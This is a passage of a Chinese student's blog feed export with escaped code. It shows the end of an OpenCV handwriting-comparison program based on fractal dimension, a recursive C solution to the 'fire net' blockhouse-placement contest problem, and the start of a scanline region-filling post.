class="line">#include&amp;lt;string.h&amp;gt;</span><br><span class="line">#include&amp;lt;stdlib.h&amp;gt;</span><br><span class="line">#include&amp;lt;opencv.hpp&amp;gt;</span><br><span class="line">#include &amp;lt;iostream&amp;gt;</span><br><span class="line">#define _CRT_SECURE_NO_WARNINGS</span><br><span class="line">using namespace cv;</span><br><span class="line">using namespace std;</span><br><span class="line">using namespace cv;</span><br><span class="line">#define MAX 20</span><br><span class="line">#define  NUM  30    //读取img的个数</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">string ImgName;</span><br><span class="line">float xielu[109];</span><br><span class="line">int n = 1;</span><br><span class="line">while (n &amp;lt;= NUM)   //100   真实图的训练</span><br><span class="line">&#123;</span><br><span class="line">Mat img;</span><br><span class="line"></span><br><span class="line">int i, j;</span><br><span class="line"></span><br><span class="line">//读取部分</span><br><span class="line">ImgName = &quot;实验&quot;;</span><br><span class="line">//int 转换string</span><br><span class="line">stringstream ss;</span><br><span class="line">string str;</span><br><span class="line">ss &amp;lt;&amp;lt; n;</span><br><span class="line">ss &amp;gt;&amp;gt; str;</span><br><span class="line"></span><br><span class="line">//ImgName = ImgName + &quot; (&quot; + str + &quot;)&quot;;    //图像文件明格式：ImgName(n)</span><br><span class="line">ImgName = ImgName + str ;    //图像文件名格式：ImgName(n)</span><br><span class="line">ImgName = &quot;E:\\21\\read_more_img\\read\\read2\\2b\\&quot; + ImgName + &quot;.png&quot;;</span><br><span class="line"></span><br><span class="line">cout &amp;lt;&amp;lt; &quot;处理：&quot; &amp;lt;&amp;lt; ImgName &amp;lt;&amp;lt; endl;</span><br><span class="line">img = imread(ImgName);//读取图片</span><br><span class="line"></span><br><span class="line">if (img.data == 0)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;[error] 没有图片\n&quot;);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cvtColor(img, img, COLOR_BGR2GRAY);</span><br><span class="line">//操作部分  读取的图像为  img </span><br><span class="line"></span><br><span class="line">//归一化图像,调整大小使得图像可比较</span><br><span class="line">Mat m = Mat(Size(900, 900), CV_8UC1);</span><br><span class="line">for (i = 0; i &amp;lt; img.rows; i++) &#123;</span><br><span class="line">for (j = 0; j &amp;lt; img.cols; j++) &#123;</span><br><span class="line">m.at&amp;lt;uchar&amp;gt;(i, j) = 255;//创建纯白图</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int xmin = 0, xmax = 3 * img.rows / 4, ymin = 0, ymax = 3 * img.cols / 4;</span><br><span class="line">printf(&quot;%d %d\n&quot;, img.rows, img.cols);</span><br><span class="line">float a1 = 600.0 / (xmax - xmin);</span><br><span class="line">float b1 = 600.0 / (ymax - ymin);</span><br><span class="line">printf(&quot;%f %f&quot;, a1, b1);</span><br><span class="line">//二值化</span><br><span class="line">for (i = 0; i &amp;lt; img.rows; i++) &#123;</span><br><span class="line">for (j = 0; j &amp;lt; img.cols; j++) &#123;</span><br><span class="line">if (img.at&amp;lt;uchar&amp;gt;(i, j) &amp;gt;= 50)</span><br><span class="line">&#123;</span><br><span class="line">img.at&amp;lt;uchar&amp;gt;(i, j) = 255;//把实验图像的背景部分变成白色    二值化</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">img.at&amp;lt;uchar&amp;gt;(i, j) = 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">for (i = 0; i &amp;lt; img.rows; i++) &#123;</span><br><span class="line">for (j = 0; j &amp;lt; img.cols; j++) &#123;</span><br><span class="line">//if (img.at&amp;lt;uchar&amp;gt;(i, j) == 0)</span><br><span class="line">&#123;</span><br><span class="line">m.at&amp;lt;uchar&amp;gt;(int(a1 * i), int(b1 * j)) = img.at&amp;lt;uchar&amp;gt;(i, j);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Mat DstPic, edge, grayImage, fushi, src, m2;</span><br><span class="line">//先使用3*3内核来降噪</span><br><span class="line">&#123;</span><br><span class="line">blur(m, edge, Size(3, 3));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">float X[MAX], Y[MAX];</span><br><span class="line"></span><br><span class="line">int num = 2;</span><br><span class="line">int a, b;</span><br><span class="line">float N = 0;</span><br><span class="line">int max = 0, min = 255;</span><br><span class="line">double x = 0;</span><br><span class="line">int k = 0;</span><br><span class="line">for (k = 0;k &amp;lt; MAX;k++) &#123;</span><br><span class="line">num += 1;</span><br><span class="line">for (i = num;i &amp;lt; m.rows;i += num) &#123;</span><br><span class="line">for (j = num;j &amp;lt; m.cols;j += num) &#123;</span><br><span class="line">for (a = i - num;a &amp;lt; i;a++) &#123;</span><br><span class="line">for (b = j - num;b &amp;lt; j;b++) &#123;</span><br><span class="line">if (m.at&amp;lt;uchar&amp;gt;(a, b) &amp;gt; max)  max = m.at&amp;lt;uchar&amp;gt;(a, b);</span><br><span class="line">if (m.at&amp;lt;uchar&amp;gt;(a, b) &amp;lt; min)  min = m.at&amp;lt;uchar&amp;gt;(a, b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">N += (max - min) / num;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">X[k] = log(N);</span><br><span class="line">Y[k] = log(num);</span><br><span class="line">printf(&quot; \nX[],Y[]  %lf  %lf\n&quot;, X[k], Y[k]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//最小二乘法求出分形维数，储存在xielu中</span><br><span class="line">float A = 0.0, B = 0.0, C = 0.0, D = 0.0;</span><br><span class="line">for (i = 0;i &amp;lt; MAX;i++) &#123;</span><br><span class="line">A += X[i] * X[i];</span><br><span class="line">B += X[i];</span><br><span class="line">C += X[i] * Y[i];</span><br><span class="line">D += Y[i];</span><br><span class="line">printf(&quot; \nA,B,C,D  %f  %f  %f   %f\n&quot;, A, B, C, D);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\nA  %f ; B  %f ;C %f ; D %f\n&quot;, A, B, C, D);</span><br><span class="line"></span><br><span class="line">xielu[n] = 1.0 * (C * MAX - B * D) / (A * MAX - B * B);</span><br><span class="line">printf(&quot;\n  xierlu  %f\n&quot;, xielu[n]);</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">n = n - 1;</span><br><span class="line">float sum = 0;</span><br><span class="line">int i, j;</span><br><span class="line">for (i = 1;i &amp;lt;=n;i++) &#123;</span><br><span class="line">sum =sum+xielu[i];</span><br><span class="line">printf(&quot;  \n  xielu[i] %f \n &quot;, xielu[i]);</span><br><span class="line">printf(&quot;  \n  %f  &quot;, sum);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n\n   维数的平均值   %f\n&quot;, 1.0 *sum / (n*1.0));</span><br><span class="line"></span><br><span class="line">float average = 1.0 * sum / (n * 1.0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int panduan[100];</span><br><span class="line">for (i = 1;i &amp;lt; 99;i++) &#123;</span><br><span class="line">panduan[i] = 0;</span><br><span class="line">&#125;</span><br><span class="line">n = 1;</span><br><span class="line">while (n &amp;lt;= NUM)   //100   待测图像组  检测部分</span><br><span class="line">&#123;</span><br><span class="line">Mat img;</span><br><span class="line"></span><br><span class="line">int i, j;</span><br><span class="line"></span><br><span class="line">//读取部分</span><br><span class="line">ImgName = &quot;实验&quot;;</span><br><span class="line">//int 转换string</span><br><span class="line">stringstream ss;</span><br><span class="line">string str;</span><br><span class="line">ss &amp;lt;&amp;lt; n;</span><br><span class="line">ss &amp;gt;&amp;gt; str;</span><br><span class="line"></span><br><span class="line">//ImgName = ImgName + &quot; (&quot; + str + &quot;)&quot;;    //图像文件明格式：ImgName(n)</span><br><span class="line">ImgName = ImgName + str;    //图像文件名格式：ImgName(n)</span><br><span class="line">ImgName = &quot;E:\\21\\read_more_img\\read\\read2\\2_b\\&quot; + ImgName + &quot;.png&quot;;</span><br><span class="line"></span><br><span class="line">cout &amp;lt;&amp;lt; &quot;处理：&quot; &amp;lt;&amp;lt; ImgName &amp;lt;&amp;lt; endl;</span><br><span class="line">img = imread(ImgName);//读取图片</span><br><span class="line"></span><br><span class="line">if (img.data == 0)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;[error] 没有图片\n&quot;);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cvtColor(img, img, COLOR_BGR2GRAY);</span><br><span class="line">//归一化图像,调整大小使得图像可比较</span><br><span class="line">Mat m = Mat(Size(900, 900), CV_8UC1);</span><br><span class="line">for (i = 0; i &amp;lt; img.rows; i++) &#123;</span><br><span class="line">for (j = 0; j &amp;lt; img.cols; j++) &#123;</span><br><span class="line">m.at&amp;lt;uchar&amp;gt;(i, j) = 255;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int xmin = 0, xmax = 3 * img.rows / 4, ymin = 0, ymax = 3 * img.cols / 4;</span><br><span class="line">printf(&quot;%d %d\n&quot;, img.rows, img.cols);</span><br><span class="line">float a1 = 600.0 / (xmax - xmin);</span><br><span class="line">float b1 = 600.0 / (ymax - ymin);</span><br><span class="line">printf(&quot;%f %f&quot;, a1, b1);</span><br><span class="line">//二值化</span><br><span class="line">for (i = 0; i &amp;lt; img.rows; i++) &#123;</span><br><span class="line">for (j = 0; j &amp;lt; img.cols; j++) &#123;</span><br><span class="line">if (img.at&amp;lt;uchar&amp;gt;(i, j) &amp;gt;= 50)</span><br><span class="line">&#123;</span><br><span class="line">img.at&amp;lt;uchar&amp;gt;(i, j) = 255;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">img.at&amp;lt;uchar&amp;gt;(i, j) = 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">for (i = 0; i &amp;lt; img.rows; i++) &#123;</span><br><span class="line">for (j = 0; j &amp;lt; img.cols; j++) &#123;</span><br><span class="line">&#123;</span><br><span class="line">m.at&amp;lt;uchar&amp;gt;(int(a1 * i), int(b1 * j)) = img.at&amp;lt;uchar&amp;gt;(i, j);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">Mat DstPic, edge, grayImage, fushi, src, m2;</span><br><span class="line">&#123;</span><br><span class="line">blur(m, edge, Size(3, 3));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">float X[MAX], Y[MAX];//使用最小二乘法计算斜率</span><br><span class="line">float sample = 0;</span><br><span class="line">int num = 2;</span><br><span class="line">int a, b;</span><br><span class="line">float N = 0;</span><br><span class="line">int max = 0, min = 255;</span><br><span class="line">double x = 0;</span><br><span class="line">int k = 0;</span><br><span class="line">for (k = 0; k &amp;lt; MAX; k++) &#123;</span><br><span class="line">num += 1;</span><br><span class="line">for (i = num; i &amp;lt; m.rows; i += num) &#123;</span><br><span class="line">for (j = num; j &amp;lt; m.cols; j += num) &#123;</span><br><span class="line">for (a = i - num; a &amp;lt; i; a++) &#123;</span><br><span class="line">for (b = j - num; b &amp;lt; j; b++) &#123;</span><br><span class="line">if (m.at&amp;lt;uchar&amp;gt;(a, b) &amp;gt; max)  max = m.at&amp;lt;uchar&amp;gt;(a, b);</span><br><span class="line">if (m.at&amp;lt;uchar&amp;gt;(a, b) &amp;lt; min)  min = m.at&amp;lt;uchar&amp;gt;(a, b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">N += (max - min) / num;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">X[k] = log(N);</span><br><span class="line">Y[k] = log(num);</span><br><span class="line">printf(&quot; \nX[],Y[]  %lf  %lf\n&quot;, X[k], Y[k]);</span><br><span class="line">&#125;</span><br><span class="line">float A = 0.0, B = 0.0, C = 0.0, D = 0.0;</span><br><span class="line">for (i = 0; i &amp;lt; MAX; i++) &#123;</span><br><span class="line">A += X[i] * X[i];</span><br><span class="line">B += X[i];</span><br><span class="line">C += X[i] * Y[i];</span><br><span class="line">D += Y[i];</span><br><span class="line">printf(&quot; \nA,B,C,D  %f  %f  %f   %f\n&quot;, A, B, C, D);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\nA  %f ; B  %f ;C %f ; D %f\n&quot;, A, B, C, D);</span><br><span class="line"></span><br><span class="line">sample = 1.0 * (C * MAX - B * D) / (A * MAX - B * B);</span><br><span class="line">printf(&quot;\n  xierlu  %f\n&quot;, sample);</span><br><span class="line">if (fabs(sample - average)/average &amp;lt;= 0.065) &#123;</span><br><span class="line">printf(&quot;\n%s 图像是同一笔迹\n&quot;,ImgName.c_str());</span><br><span class="line">panduan[n] = 1;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">printf(&quot;\n%s 图像不是同一笔迹\n&quot;, ImgName.c_str());</span><br><span class="line">panduan[n] = 0;</span><br><span class="line">&#125;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">for (i = 1;i &amp;lt;= n - 1;i++) &#123;</span><br><span class="line">if(panduan[i]==0)</span><br><span class="line">printf(&quot;\n\n图像实验%d是错的!!\n&quot;, i);</span><br><span class="line">else &#123;</span><br><span class="line">printf(&quot;\n\n图像实验%d是对的!!\n&quot;, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">waitKey(0);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote></blockquote><p>共计21个图形样本，错误样本5个，正确样本16个</p><p>|精确度要求|0.1|0.08|0.07|0.065|0.06|0.05<br>|——<br>|F-&gt;T|4|4|3|2|2|1<br>|T-&gt;F|0|1|1|1|2|4</p>]]></content>
      
      
      <categories>
          
          <category> cv </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>火力网的c语言代码，递归调用</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E7%81%AB%E5%8A%9B%E7%BD%91%E7%9A%84c%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%EF%BC%8C%E9%80%92%E5%BD%92%E8%B0%83%E7%94%A8/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E7%81%AB%E5%8A%9B%E7%BD%91%E7%9A%84c%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%EF%BC%8C%E9%80%92%E5%BD%92%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  火力网的c语言代码，递归调用</p><h1 id="火力网的c语言代码，递归调用"><a href="#火力网的c语言代码，递归调用" class="headerlink" title="火力网的c语言代码，递归调用"></a>火力网的c语言代码，递归调用</h1><blockquote></blockquote><p>假设我们有一个直街道广场的城市。一个城市的地图用n行n列的方形板，每一个代表一个街道或一块墙。<br>一个碉堡就是一个小城堡，有四个开口用以射击。四开口面朝北，东，南，西，分别。会有一个机枪射击通过每个开口。<br>在这里，我们假定子弹是如此强大，它可以运行在任何距离和毁灭的道路上一个碉堡。另一方面，墙是如此强烈地建成，可以阻止子弹。<br>其目标是把城市中的许多碉堡使没有两个可以摧毁对方。一个配置的碉堡是法律规定，没有两个碉堡是在地图上的同一行或列除非有至少一个壁分离。在这个问题中，我们会考虑小城市广场（最多4×4）包含墙壁透过子弹不能贯穿。<br> <img alt="示例" src="https://img-blog.csdnimg.cn/20191223143352835.png"><br> 下面的图像显示五张相同的牌。第一张照片是空板，第二和第三的照片显示法律的配置，以及第四和第五的图片显示非法配置。这个委员会，在法律结构的碉堡数目最多为5；第二张图片展示了一种方式，但也有一些其他的方法。<br>你的任务是写一个程序，设计一个地图，计算碉堡可以放置在城市中的法律配置的最大数量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">#include&amp;lt;malloc.h&amp;gt;</span><br><span class="line">#include&amp;lt;string.h&amp;gt;</span><br><span class="line">#include&amp;lt;stdlib.h&amp;gt;</span><br><span class="line">#include &amp;lt;stdio.h&amp;gt;</span><br><span class="line">void search(int x,int y,int sum);</span><br><span class="line">int bol[4][4];//表示障碍  和  是否有碉堡</span><br><span class="line">int n;</span><br><span class="line">int max=0;//最大数量</span><br><span class="line">int ke(int x,int y);//可以放置碉堡</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  int i,j;</span><br><span class="line">  char s;</span><br><span class="line">  char ss[4][4];</span><br><span class="line">  while(scanf(&quot;%d&quot;,&amp;amp;n)!=EOF&amp;amp;&amp;amp;n!=0)</span><br><span class="line">  &#123;</span><br><span class="line">  max=0;</span><br><span class="line">   //printf(&quot;\n&quot;);</span><br><span class="line">  for(i=0;i&amp;lt;=n-1;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  getchar(); </span><br><span class="line">  for(j=0;j&amp;lt;=n-1;j++)</span><br><span class="line">  &#123;</span><br><span class="line">   scanf(&quot;%c&quot;,&amp;amp;ss[i][j]);</span><br><span class="line">   if(ss[i][j]==&#x27;X&#x27;)</span><br><span class="line">   &#123;</span><br><span class="line">   bol[i][j]=-1;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">   bol[i][j]=0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line">  /* printf(&quot;\n&quot;);</span><br><span class="line">   for(i=0;i&amp;lt;=n-1;i++)</span><br><span class="line">   &#123;</span><br><span class="line">   for(j=0;j&amp;lt;=n-1;j++)</span><br><span class="line">   &#123;</span><br><span class="line">   printf(&quot;%c&quot;,ss[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">   &#125;*/</span><br><span class="line">   </span><br><span class="line">    /*for(i=0;i&amp;lt;=n-1;i++)</span><br><span class="line">   &#123;</span><br><span class="line">   for(j=0;j&amp;lt;=n-1;j++)</span><br><span class="line">   &#123;</span><br><span class="line">   printf(&quot;%2d&quot;,bol[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">   &#125;*/</span><br><span class="line">   //printf(&quot;\n&quot;);</span><br><span class="line">    search(0,0,0);</span><br><span class="line">    printf(&quot;%d\n&quot;,max);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">void search(int x,int y,int sum)</span><br><span class="line">&#123;</span><br><span class="line">int i,j;</span><br><span class="line">int p,q;</span><br><span class="line">i=x;</span><br><span class="line">j=y;</span><br><span class="line">if(i==n&amp;amp;&amp;amp;j==0) </span><br><span class="line">    &#123;</span><br><span class="line">    if(sum&amp;gt;max)</span><br><span class="line">    &#123;</span><br><span class="line">    max=sum;</span><br><span class="line">&#125;</span><br><span class="line">    /*printf(&quot;%d\n&quot;,sum);</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    for(p=0;p&amp;lt;=n-1;p++)</span><br><span class="line">    &#123;</span><br><span class="line">    for(q=0;q&amp;lt;=n-1;q++)</span><br><span class="line">    &#123;</span><br><span class="line">    printf(&quot;%2d&quot;,bol[p][q]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;*/</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">if(ke(i,j)&amp;amp;&amp;amp;bol[i][j]!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">    if(j!=n-1)</span><br><span class="line">    &#123;</span><br><span class="line">    bol[i][j]=1;//在此地放置</span><br><span class="line">    //printf(&quot;测试%d %d\n&quot;,i,j);</span><br><span class="line">search(i,1+j,sum+1);</span><br><span class="line">bol[i][j]=0;//不在此地放置并重置</span><br><span class="line">search(i,j+1,sum);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    bol[i][j]=1;</span><br><span class="line">//   printf(&quot;测试%d %d\n&quot;,i,j);</span><br><span class="line">search(i+1,0,sum+1);</span><br><span class="line">bol[i][j]=0;</span><br><span class="line">search(i+1,0,sum);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">if(j!=n-1)</span><br><span class="line">    &#123;</span><br><span class="line">    search(i,j+1,sum);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">search(i+1,0,sum);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line">int ke(int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">int i,j;</span><br><span class="line">for(i=y+1;i&amp;lt;=n-1&amp;amp;&amp;amp;bol[x][i]!=-1;i++)//右侧敌人 </span><br><span class="line">&#123;</span><br><span class="line">if(bol[x][i]==1)</span><br><span class="line">&#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">for(i=y-1;i&amp;gt;=0&amp;amp;&amp;amp;bol[x][i]!=-1;i--)//左侧敌人 </span><br><span class="line">&#123;</span><br><span class="line">if(bol[x][i]==1)</span><br><span class="line">&#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">for(j=x+1;j&amp;lt;=n-1&amp;amp;&amp;amp;bol[j][y]!=-1;j++)//下侧敌人 </span><br><span class="line">&#123;</span><br><span class="line">if(bol[j][y]==1)</span><br><span class="line">&#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">for(j=x-1;j&amp;gt;=0&amp;amp;&amp;amp;bol[j][y]!=-1;j--)//上侧敌人</span><br><span class="line">&#123;</span><br><span class="line">if(bol[j][y]==1)</span><br><span class="line">&#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注释掉的是调试数据的输出。<br> 可以把放置情况输出。</p>]]></content>
      
      
      <categories>
          
          <category> acm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生，acm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>直线扫描法，填充（闭合？）区域</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E7%9B%B4%E7%BA%BF%E6%89%AB%E6%8F%8F%E6%B3%95%EF%BC%8C%E5%A1%AB%E5%85%85%EF%BC%88%E9%97%AD%E5%90%88%EF%BC%9F%EF%BC%89%E5%8C%BA%E5%9F%9F/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E7%9B%B4%E7%BA%BF%E6%89%AB%E6%8F%8F%E6%B3%95%EF%BC%8C%E5%A1%AB%E5%85%85%EF%BC%88%E9%97%AD%E5%90%88%EF%BC%9F%EF%BC%89%E5%8C%BA%E5%9F%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  直线扫描法，填充（闭合？）区域</p><h1 id="直线扫描法，填充（闭合？）区域"><a href="#直线扫描法，填充（闭合？）区域" class="headerlink" title="直线扫描法，填充（闭合？）区域"></a>直线扫描法，填充（闭合？）区域</h1><p>写着玩的，不知道正经的直线扫描法是不是这样的。<br> 效果不好，图像像素的情况不像是想象的那么简单。<br> 使用横向和纵向的线条找出闭合的区域<br> 结果为 横向图像的闭合 与 纵向图像的闭合 结果的 交集。<br> <img alt="不放图片。" src="https://img-blog.csdnimg.cn/20210705155340963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>结果有线条感，可能在更加简单的图形中能用。图像中有复杂实体的情况几乎没法用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line"><span 